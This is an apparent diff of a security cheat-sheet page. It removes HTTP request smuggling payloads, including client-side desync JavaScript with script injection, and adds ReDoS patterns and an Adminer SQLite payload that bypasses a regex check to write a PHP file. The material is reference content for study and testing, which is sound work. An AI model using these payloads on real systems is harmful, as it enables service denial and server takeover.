@@ -1,181 +1,103 @@
-# Request Smuggling
+# Regular Expression
 
-> HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.
+> Regular Expression Denial of Service (ReDoS) is a type of attack that exploits the fact that certain regular expressions can take an extremely long time to process, causing applications or services to become unresponsive or crash.
 
 ## Summary
 
 * [Tools](#tools)
 * [Methodology](#methodology)
-    * [CL.TE Vulnerabilities](#clte-vulnerabilities)
-    * [TE.CL Vulnerabilities](#tecl-vulnerabilities)
-    * [TE.TE Vulnerabilities](#tete-vulnerabilities)
-    * [HTTP/2 Request Smuggling](#http2-request-smuggling)
-    * [Client-Side Desync](#client-side-desync)
-* [Labs](#labs)
+    * [Evil Regex](#evil-regex)
+    * [Backtrack Limit](#backtrack-limit)
 * [References](#references)
 
 ## Tools
 
-* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - An extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks
-* [defparam/Smuggler](https://github.com/defparam/smuggler) - An HTTP Request Smuggling / Desync testing tool written in Python 3
-* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs.
+* [tjenkinson/redos-detector](https://github.com/tjenkinson/redos-detector) - A CLI and library which tests with certainty if a regex pattern is safe from ReDoS attacks. Supported in the browser, Node and Deno.
+* [doyensec/regexploit](https://github.com/doyensec/regexploit) - Find regular expressions which are vulnerable to ReDoS (Regular Expression Denial of Service)
+* [devina.io/redos-checker](https://devina.io/redos-checker) - Examine regular expressions for potential Denial of Service vulnerabilities
 
 ## Methodology
 
-If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as PortSwigger suggests `Manually fixing the length fields in request smuggling attacks can be tricky.`.
+### Evil Regex
 
-### CL.TE Vulnerabilities
+Evil Regex contains:
 
-> The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
+* Grouping with repetition
+* Inside the repeated group:
+    * Repetition
+    * Alternation with overlapping
 
-```powershell
-POST / HTTP/1.1
-Host: vulnerable-website.com
-Content-Length: 13
-Transfer-Encoding: chunked
+**Examples**:
 
-0
+* `(a+)+`
+* `([a-zA-Z]+)*`
+* `(a|aa)+`
+* `(a|a?)+`
+* `(.*a){x}` for x \> 10
 
-SMUGGLED
-```
-
-Example:
-
-```powershell
-POST / HTTP/1.1
-Host: domain.example.com
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 6
-Transfer-Encoding: chunked
-
-0
-
-G
-```
-
-### TE.CL Vulnerabilities
-
-> The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
-
-```powershell
-POST / HTTP/1.1
-Host: vulnerable-website.com
-Content-Length: 3
-Transfer-Encoding: chunked
-
-8
-SMUGGLED
-0
-```
-
-Example:
-
-```powershell
-POST / HTTP/1.1
-Host: domain.example.com
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
-Content-Length: 4
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Accept-Encoding: gzip, deflate
-
-5c
-GPOST / HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
-x=1
-0
-
-
-```
-
-:warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.You need to include the trailing sequence `\r\n\r\n` following the final 0.
-
-### TE.TE Vulnerabilities
-
-> The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
-
-```powershell
-Transfer-Encoding: xchunked
-Transfer-Encoding : chunked
-Transfer-Encoding: chunked
-Transfer-Encoding: x
-Transfer-Encoding:[tab]chunked
-[space]Transfer-Encoding: chunked
-X: X[\n]Transfer-Encoding: chunked
-Transfer-Encoding
-: chunked
-```
-
-## HTTP/2 Request Smuggling
-
-HTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header
+These regular expressions can be exploited with `aaaaaaaaaaaaaaaaaaaaaaaa!` (20 'a's followed by a '!').
 
 ```ps1
-:method GET
-:path /
-:authority www.example.com
-header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
+aaaaaaaaaaaaaaaaaaaa! 
 ```
 
-## Client-Side Desync
+For this input, the regex engine will try all possible ways to group the `a` characters before realizing that the match ultimately fails because of the `!`. This results in an explosion of backtracking attempts.
 
-On some paths, servers don't expect POST requests, and will treat them as simple GET requests, ignoring the payload, eg:
+### Backtrack Limit
 
-```ps1
-POST / HTTP/1.1
-Host: www.example.com
-Content-Length: 37
+Backtracking in regular expressions occurs when the regex engine tries to match a pattern and encounters a mismatch. The engine then backtracks to the previous matching position and tries an alternative path to find a match. This process can be repeated many times, especially with complex patterns and large input strings.  
 
-GET / HTTP/1.1
-Host: www.example.com
+**PHP PCRE configuration options**:
+
+| Name                 | Default  | Note                     |
+| -------------------- | -------- | ------------------------ |
+| pcre.backtrack_limit |  1000000 | 100000 for `PHP < 5.3.7` |
+| pcre.recursion_limit |  100000  | /                        |
+| pcre.jit             | 1        | /                        |
+
+Sometimes it is possible to force the regex to exceed more than 100 000 recursions which will cause a ReDOS and make `preg_match` returning false:
+
+```php
+$pattern = '/(a+)+$/';
+$subject = str_repeat('a', 1000) . 'b';
+
+if (preg_match($pattern, $subject)) {
+    echo "Match found";
+} else {
+    echo "No match";
+}
 ```
 
-could be treated as two requests when it should only be one. When the backend server responds twice, the frontend server will assume only the first response is related to this request.
+**Real-Word case: Adminer SQLite RCE**:
 
-To exploit this, an attacker can use JavaScript to trigger their victim to send a POST to the vulnerable site:
+Adminer used a regular expression to prevent SQLite queries beginning with ATTACH:
 
-```javascript
-fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
+```php
+$pattern = "~^(?:\\s|/\\*[\s\S]*?\\*/|(?:#|--)[^\n]*\n?|--\r?\n)*+ATTACH\\b~i";
+if(preg_match($pattern, $query, $match)){
+ die('error');
+}
 ```
 
-This could be used to:
+The check treated both `0` (no match) and `false` (regular expression evaluation failure) as an allowed query. An attacker could prefix an `ATTACH` query with hundreds of thousands of empty SQL comments:
 
-* get the vulnerable site to store a victim's credentials somewhere the attacker can access it
-* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)
-* to get the victim to run arbitrary JavaScript as if it were from the site
+```php
+<?php
+$payload = <<<'SQL'
+ATTACH DATABASE 'lol.php' AS lol;
+CREATE TABLE lol.pwn (data text);
+INSERT INTO lol.pwn (data) VALUES ('<?php phpinfo(); ?>');
+SQL;
 
-**Example**:
-
-```javascript
-fetch('https://www.example.com/redirect', {
-    method: 'POST',
-        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
-        credentials: 'include',
-        mode: 'cors' // throw an error instead of following redirect
-}).catch(() => {
-        location = 'https://www.example.com/'
-})
+echo str_repeat("--\n", 350000) . $payload;
 ```
 
-This script tells the victim browser to send a `POST` request to `www.example.com/redirect`. That returns a redirect which is blocked by CORS, and causes the browser to execute the catch block, by going to `www.example.com`.
-
-`www.example.com` now incorrectly processes the `HEAD` request in the `POST`'s body, instead of the browser's `GET` request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request and finally the browser's actual `GET` request.
-Since the browser only sent one request, it accepts the response to the `HEAD` request as the response to its `GET` request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.
-
-## Labs
-
-* [PortSwigger - HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
-* [PortSwigger - HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
-* [PortSwigger - HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
-* [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
-* [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)
+Processing the comments exhausted PHP PCRE's backtracking limit. `preg_match()` returned `false`, which the application confused with a clean non-match. The blocked `ATTACH` query was consequently executed.
 
 ## References
 
-* [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - October 16, 2020](https://web.archive.org/web/20260111201639/https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
-* [Advanced Request Smuggling - PortSwigger - October 26, 2021](https://web.archive.org/web/20260228102047/https://portswigger.net/web-security/request-smuggling/advanced)
-* [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling - James Kettle (@albinowax) - August 10, 2022](https://web.archive.org/web/20220810190719/https://portswigger.net/research/browser-powered-desync-attacks)
-* [HTTP Desync Attacks: Request Smuggling Reborn - James Kettle (@albinowax) - August 7, 2019](https://web.archive.org/web/20260228152820/https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
-* [Request Smuggling Tutorial - PortSwigger - September 28, 2019](https://web.archive.org/web/20190821011451/https://portswigger.net/web-security/request-smuggling)
+* [Intigriti Challenge 1223 - Hackbook Of A Hacker - December 21, 2023](https://web.archive.org/web/20260210185049/https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)
+* [MyBB Admin Panel RCE CVE-2023-41362 - SorceryIE - September 11, 2023](https://web.archive.org/web/20251115110845/https://blog.sorcery.ie/posts/mybb_acp_rce/)
+* [OWASP Validation Regex Repository - OWASP - March 14, 2018](https://web.archive.org/web/20241005224013/https://wiki.owasp.org/index.php/OWASP_Validation_Regex_Repository)
+* [PCRE > Installing/Configuring - PHP Manual - May 3, 2008](https://web.archive.org/web/20260219065508/https://www.php.net/manual/en/pcre.configuration.php)
+* [Regular expression Denial of Service - ReDoS - Adar Weidman - December 4, 2019](https://web.archive.org/web/20200309080846/https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
